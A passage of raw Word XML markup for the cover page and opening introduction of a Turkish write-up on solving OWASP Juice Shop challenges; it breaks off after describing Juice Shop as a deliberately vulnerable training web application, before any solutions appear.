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ajorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="3E3E67" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:id w:val="1833336649"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Cover Pages"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:tbl>
          <w:tblPr>
            <w:tblpPr w:leftFromText="187" w:rightFromText="187" w:tblpYSpec="bottom"/>
            <w:tblOverlap w:val="never"/>
            <w:tblW w:w="5000" w:type="pct"/>
            <w:tblCellMar>
              <w:top w:w="115" w:type="dxa"/>
              <w:left w:w="115" w:type="dxa"/>
              <w:bottom w:w="72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1059"/>
            <w:gridCol w:w="2789"/>
            <w:gridCol w:w="1581"/>
            <w:gridCol w:w="3931"/>
          </w:tblGrid>
          <w:tr w:rsidR="00BC26C8">
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="1086" w:type="dxa"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="2842" w:type="dxa"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="0018091E" w:rsidP="00CC58B6">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
                <w:sdt>
                  <w:sdtPr>
                    <w:rPr>
                      <w:color w:val="424456" w:themeColor="text2"/>
                      <w:szCs w:val="22"/>
                    </w:rPr>
                    <w:alias w:val="Tarih"/>
                    <w:id w:val="281571602"/>
                    <w:placeholder>
                      <w:docPart w:val="580F3F796259414FAC801F41ECA0027B"/>
                    </w:placeholder>
                    <w:dataBinding w:prefixMappings="xmlns:ns0='http://schemas.microsoft.com/office/2006/coverPageProps'" w:xpath="/ns0:CoverPageProperties[1]/ns0:PublishDate[1]" w:storeItemID="{55AF091B-3C7A-41E3-B477-F2FDAA23CFDA}"/>
                    <w:date w:fullDate="2019-12-09T00:00:00Z">
                      <w:dateFormat w:val="M/d/yyyy"/>
                      <w:lid w:val="en-US"/>
                      <w:storeMappedDataAs w:val="dateTime"/>
                      <w:calendar w:val="gregorian"/>
                    </w:date>
                  </w:sdtPr>
                  <w:sdtEndPr/>
                  <w:sdtContent>
                    <w:r w:rsidR="00CC58B6">
                      <w:rPr>
                        <w:color w:val="424456" w:themeColor="text2"/>
                        <w:szCs w:val="22"/>
                        <w:lang w:val="en-US"/>
                      </w:rPr>
                      <w:t>12/9/2019</w:t>
                    </w:r>
                  </w:sdtContent>
                </w:sdt>
              </w:p>
            </w:tc>
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="5648" w:type="dxa"/>
                <w:gridSpan w:val="2"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
          </w:tr>
          <w:tr w:rsidR="00BC26C8">
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="3928" w:type="dxa"/>
                <w:gridSpan w:val="2"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:tbl>
                <w:tblPr>
                  <w:tblW w:w="5000" w:type="pct"/>
                  <w:tblCellMar>
                    <w:left w:w="0" w:type="dxa"/>
                    <w:right w:w="0" w:type="dxa"/>
                  </w:tblCellMar>
                  <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
                </w:tblPr>
                <w:tblGrid>
                  <w:gridCol w:w="957"/>
                  <w:gridCol w:w="2661"/>
                </w:tblGrid>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="86"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="990" w:type="dxa"/>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok"/>
                        <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="text" w:yAlign="bottom"/>
                        <w:suppressOverlap/>
                      </w:pPr>
                    </w:p>
                  </w:tc>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="2754" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="6" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok"/>
                        <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="text" w:yAlign="bottom"/>
                        <w:suppressOverlap/>
                      </w:pPr>
                    </w:p>
                  </w:tc>
                </w:tr>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="86"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="990" w:type="dxa"/>
                      <w:tcBorders>
                        <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok"/>
                        <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="text" w:yAlign="bottom"/>
                        <w:suppressOverlap/>
                      </w:pPr>
                    </w:p>
                  </w:tc>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="2754" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok"/>
                        <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="text" w:yAlign="bottom"/>
                        <w:suppressOverlap/>
                      </w:pPr>
                    </w:p>
                  </w:tc>
                </w:tr>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="115"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="990" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok"/>
                        <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="text" w:yAlign="bottom"/>
                        <w:suppressOverlap/>
                      </w:pPr>
                    </w:p>
                  </w:tc>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="2754" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok"/>
                        <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="text" w:yAlign="bottom"/>
                        <w:suppressOverlap/>
                      </w:pPr>
                    </w:p>
                  </w:tc>
                </w:tr>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="58"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="990" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok"/>
                        <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="text" w:yAlign="bottom"/>
                        <w:suppressOverlap/>
                      </w:pPr>
                    </w:p>
                  </w:tc>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="2754" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="12" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok"/>
                        <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="text" w:yAlign="bottom"/>
                        <w:suppressOverlap/>
                      </w:pPr>
                    </w:p>
                  </w:tc>
                </w:tr>
              </w:tbl>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="5648" w:type="dxa"/>
                <w:gridSpan w:val="2"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
          </w:tr>
          <w:tr w:rsidR="00BC26C8">
            <w:trPr>
              <w:trHeight w:val="1800"/>
            </w:trPr>
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="9576" w:type="dxa"/>
                <w:gridSpan w:val="4"/>
                <w:tcMar>
                  <w:top w:w="115" w:type="dxa"/>
                  <w:left w:w="115" w:type="dxa"/>
                  <w:bottom w:w="72" w:type="dxa"/>
                  <w:right w:w="115" w:type="dxa"/>
                </w:tcMar>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="0018091E">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                  <w:rPr>
                    <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
                    <w:color w:val="53548A" w:themeColor="accent1"/>
                    <w:sz w:val="72"/>
                    <w:szCs w:val="72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color w:val="53548A" w:themeColor="accent1"/>
                      <w:sz w:val="72"/>
                      <w:szCs w:val="72"/>
                    </w:rPr>
                    <w:alias w:val="Başlık"/>
                    <w:id w:val="220683848"/>
                    <w:placeholder>
                      <w:docPart w:val="D8E4383E5E1245EAB6C8C714FFEACEEC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CC58B6">
                      <w:rPr>
                        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
                        <w:color w:val="53548A" w:themeColor="accent1"/>
                        <w:sz w:val="72"/>
                        <w:szCs w:val="72"/>
                      </w:rPr>
                      <w:t>OWASP-JUICE SHOP</w:t>
                    </w:r>
                  </w:sdtContent>
                </w:sdt>
              </w:p>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="0018091E" w:rsidP="00CC58B6">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
                <w:sdt>
                  <w:sdtPr>
                    <w:rPr>
                      <w:i/>
                      <w:iCs/>
                      <w:color w:val="424456" w:themeColor="text2"/>
                      <w:sz w:val="28"/>
                      <w:szCs w:val="28"/>
                    </w:rPr>
                    <w:alias w:val="Alt Başlık"/>
                    <w:id w:val="220683832"/>
                    <w:placeholder>
                      <w:docPart w:val="2CA848442B984E49B7C3F6BD29A9AEA2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0E38F7">
                      <w:rPr>
                        <w:i/>
                        <w:iCs/>
                        <w:color w:val="424456" w:themeColor="text2"/>
                        <w:sz w:val="28"/>
                        <w:szCs w:val="28"/>
                      </w:rPr>
                      <w:t>Challangeların Çözümü</w:t>
                    </w:r>
                  </w:sdtContent>
                </w:sdt>
              </w:p>
            </w:tc>
          </w:tr>
          <w:tr w:rsidR="00BC26C8">
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="1086" w:type="dxa"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="4474" w:type="dxa"/>
                <w:gridSpan w:val="2"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="4016" w:type="dxa"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:tbl>
                <w:tblPr>
                  <w:tblW w:w="5000" w:type="pct"/>
                  <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
                </w:tblPr>
                <w:tblGrid>
                  <w:gridCol w:w="1062"/>
                  <w:gridCol w:w="700"/>
                  <w:gridCol w:w="1939"/>
                </w:tblGrid>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="72"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="1098" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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720" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="6" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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2012" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="6" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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</w:tr>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="86"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="1098" w:type="dxa"/>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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720" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="6" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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2012" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="6" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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</w:tr>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="101"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="1098" w:type="dxa"/>
                      <w:tcBorders>
                        <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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720" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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2012" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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</w:tr>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="43"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="1098" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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720" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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2012" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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</w:tr>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="86"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="1098" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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720" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="24" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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2012" w:type="dxa"/>
                      <w:tcBorders>
                        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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</w:tr>
                <w:tr w:rsidR="00BC26C8">
                  <w:trPr>
                    <w:trHeight w:hRule="exact" w:val="58"/>
                  </w:trPr>
                  <w:tc>
                    <w:tcPr>
                      <w:tcW w:w="1098" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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720" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="12" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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2012" w:type="dxa"/>
                      <w:tcBorders>
                        <w:top w:val="single" w:sz="8" w:space="0" w:color="438086" w:themeColor="accent2"/>
                        <w:bottom w:val="single" w:sz="12" w:space="0" w:color="438086" w:themeColor="accent2"/>
                      </w:tcBorders>
                    </w:tcPr>
                    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="005F2AAD">
                      <w:pPr>
                        <w:pStyle w:val="AralkYok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</w:tr>
              </w:tbl>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
          </w:tr>
          <w:tr w:rsidR="00BC26C8">
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="1086" w:type="dxa"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="4474" w:type="dxa"/>
                <w:gridSpan w:val="2"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
              </w:p>
            </w:tc>
            <w:tc>
              <w:tcPr>
                <w:tcW w:w="4016" w:type="dxa"/>
                <w:vAlign w:val="center"/>
              </w:tcPr>
              <w:p w:rsidR="00BC26C8" w:rsidRDefault="0018091E">
                <w:pPr>
                  <w:pStyle w:val="AralkYok"/>
                </w:pPr>
                <w:sdt>
                  <w:sdtPr>
                    <w:rPr>
                      <w:color w:val="424456" w:themeColor="text2"/>
                      <w:szCs w:val="22"/>
                    </w:rPr>
                    <w:alias w:val="Yazar"/>
                    <w:id w:val="81130488"/>
                    <w:placeholder>
                      <w:docPart w:val="B5C07757C45C49DD9A1219EB6D24B3CF"/>
                    </w:placeholder>
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<w:text/>
                  </w:sdtPr>
                  <w:sdtEndPr/>
                  <w:sdtContent>
                    <w:r w:rsidR="00CC58B6">
                      <w:rPr>
                        <w:color w:val="424456" w:themeColor="text2"/>
                        <w:szCs w:val="22"/>
                      </w:rPr>
                      <w:t>Muhammed Said Bakırcı</w:t>
                    </w:r>
                  </w:sdtContent>
                </w:sdt>
              </w:p>
            </w:tc>
          </w:tr>
        </w:tbl>
        <w:p w:rsidR="00BC26C8" w:rsidRDefault="0047436E">
          <w:pPr>
            <w:pStyle w:val="KonuBal"/>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
              <w:szCs w:val="20"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:color w:val="000000"/>
              <w:sz w:val="20"/>
              <w:szCs w:val="20"/>
              <w14:textFill>
                <w14:solidFill>
                  <w14:srgbClr w14:val="000000">
                    <w14:lumMod w14:val="75000"/>
                  </w14:srgbClr>
                </w14:solidFill>
              </w14:textFill>
            </w:rPr>
            <w:br w:type="page"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:sdt>
      <w:sdtPr>
        <w:id w:val="223570831"/>
        <w:placeholder>
          <w:docPart w:val="C504DB3BDF6E4C90A23E7E88D7DA8DAE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:rsidR="00BC26C8" w:rsidRDefault="00CC58B6">
          <w:pPr>
            <w:pStyle w:val="KonuBal"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:color w:val="000000"/>
              <w:sz w:val="20"/>
              <w:szCs w:val="20"/>
              <w14:textFill>
                <w14:solidFill>
                  <w14:srgbClr w14:val="000000">
                    <w14:lumMod w14:val="75000"/>
                  </w14:srgbClr>
                </w14:solidFill>
              </w14:textFill>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:t>OWASP-JUICE SHOP</w:t>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00C220DB">
      <w:pPr>
        <w:pStyle w:val="Altyaz"/>
        <w:rPr>
          <w:color w:val="53548A" w:themeColor="accent1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="53548A" w:themeColor="accent1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3441940</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>-601823</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="905510" cy="1095542"/>
            <wp:effectExtent l="0" t="0" r="889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5510" cy="10955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sdt>
        <w:sdtPr>
          <w:rPr>
            <w:color w:val="53548A" w:themeColor="accent1"/>
          </w:rPr>
          <w:id w:val="223570817"/>
          <w:placeholder>
            <w:docPart w:val="4D883651C68B425BA766D5D2A6C75F70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EndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00CC58B6">
            <w:rPr>
              <w:color w:val="53548A" w:themeColor="accent1"/>
            </w:rPr>
            <w:t>Challangel</w:t>
          </w:r>
          <w:r w:rsidR="000E38F7">
            <w:rPr>
              <w:color w:val="53548A" w:themeColor="accent1"/>
            </w:rPr>
            <w:t>a</w:t>
          </w:r>
          <w:r w:rsidR="00CC58B6">
            <w:rPr>
              <w:color w:val="53548A" w:themeColor="accent1"/>
            </w:rPr>
            <w:t>r</w:t>
          </w:r>
          <w:r w:rsidR="000E38F7">
            <w:rPr>
              <w:color w:val="53548A" w:themeColor="accent1"/>
            </w:rPr>
            <w:t>ı</w:t>
          </w:r>
          <w:r w:rsidR="00CC58B6">
            <w:rPr>
              <w:color w:val="53548A" w:themeColor="accent1"/>
            </w:rPr>
            <w:t>n Çözümü</w:t>
          </w:r>
        </w:sdtContent>
      </w:sdt>
    </w:p>
    <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8" w:rsidP="000E38F7"/>
    <w:p w:rsidR="00BC26C8" w:rsidRDefault="000E38F7">
      <w:r>
        <w:t>Juice Shop OWASP tarafından OWASP</w:t>
      </w:r>
      <w:r w:rsidR="001D04F8">
        <w:t>’ın belirttiği</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:history="1">
        <w:r w:rsidRPr="001D04F8">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
          <w:t>Top 10</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="001D04F8">
        <w:t xml:space="preserve"> kritik</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001D04F8">
        <w:t xml:space="preserve">zafiyeti </w:t>
      </w:r>
      <w:r>
        <w:t>içerisinde</w:t>
      </w:r>
      <w:r w:rsidR="001D04F8">
        <w:t xml:space="preserve"> bulunduran zafiyetli bir web uygulamasıdır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00825613" w:rsidRDefault="00B617AF">
      <w:r>
        <w:t xml:space="preserve">Juice Shop </w:t>
      </w:r>
      <w:hyperlink r:id="rId12" w:history="1">
        <w:r w:rsidRPr="0061417F">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
